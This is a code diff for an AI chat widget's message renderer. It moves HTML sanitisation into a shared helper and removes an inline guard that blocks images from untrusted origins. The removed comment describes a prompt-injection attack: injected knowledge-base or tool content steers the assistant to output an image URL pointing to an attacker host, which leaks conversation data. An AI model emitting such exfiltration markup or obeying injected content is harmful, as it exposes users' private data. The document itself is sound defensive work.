@@ -13,10 +13,10 @@
  * styling. Those stay in the wrappers.
  */
 import { citedSources, withCitationChips } from '@/lib/citations';
+import { sanitizeUntrustedHtml } from '@/lib/sanitizeHtml';
 import type { MessageSource } from '@/types/chat';
 import type { ToolArtifact } from '@/types/stream';
 import { useClipboard } from '@vueuse/core';
-import DOMPurify from 'dompurify';
 import hljs from 'highlight.js';
 import { Marked } from 'marked';
 import markedAlert from 'marked-alert';
@@ -28,61 +28,6 @@ import { useI18n } from 'vue-i18n';
 import CitationCard from './CitationCard.vue';
 import EChartBlock from './EChartBlock.vue';
 import InlineFormBlock from './InlineFormBlock.vue';
-
-/**
- * Image-exfiltration guard.
- *
- * Assistant output is attacker-influenceable (a prompt-injected KB chunk or
- * tool result can steer the model). DOMPurify already strips <script>/onerror,
- * but it leaves <img src="https://attacker/?leak=…"> intact, and the browser
- * auto-fetches it — a zero-click channel that exfiltrates conversation/PII to
- * an attacker host (and fires again in the operator's dashboard). There is no
- * img-src CSP on the widget surface to stop it.
- *
- * So we hard-restrict where rendered <img> may load from: same-origin, the
- * canonical app origin (chunk images are absolute to the main domain even on
- * an agent's custom domain), and inline data: images (no network egress). Every other
- * src is dropped. Registered once at module load; applies to every
- * DOMPurify.sanitize() call in the app.
- */
-const ALLOWED_IMG_ORIGINS = new Set<string>();
-if (typeof window !== 'undefined') {
-    ALLOWED_IMG_ORIGINS.add(window.location.origin);
-    const appUrl = document.querySelector('meta[name="app-url"]')?.getAttribute('content');
-    if (appUrl) {
-        try {
-            ALLOWED_IMG_ORIGINS.add(new URL(appUrl).origin);
-        } catch {
-            /* malformed meta — fall back to same-origin only */
-        }
-    }
-}
-
-DOMPurify.addHook('afterSanitizeAttributes', (node) => {
-    if (!(node instanceof Element) || node.tagName !== 'IMG') {
-        return;
-    }
-
-    const src = node.getAttribute('src') ?? '';
-
-    // Inline images make no network request, so they cannot exfiltrate.
-    if (src.startsWith('data:image/')) {
-        return;
-    }
-
-    let allowed = false;
-    try {
-        const url = new URL(src, window.location.origin);
-        allowed = (url.protocol === 'http:' || url.protocol === 'https:') && ALLOWED_IMG_ORIGINS.has(url.origin);
-    } catch {
-        allowed = false;
-    }
-
-    if (!allowed) {
-        node.removeAttribute('src');
-        node.removeAttribute('srcset');
-    }
-});
 
 const props = withDefaults(
     defineProps<{
@@ -186,8 +131,9 @@ function formatMessage(content: string): string {
     // Assistant/visitor content (and prompt-injected model output) is rendered
     // via v-html in both the live widget AND the privileged admin chat-log /
     // handoff UIs. Sanitize so injected <img onerror=…>, <script>, javascript:
-    // hrefs, etc. can never execute. marked v15 does NOT sanitize.
-    return DOMPurify.sanitize(html, { ADD_ATTR: ['target'] });
+    // hrefs and self-loading media can never run or leak the conversation.
+    // marked v15 does NOT sanitize.
+    return sanitizeUntrustedHtml(html);
 }
 
 // While streaming, debounce reparsing on a trailing edge — markdown +
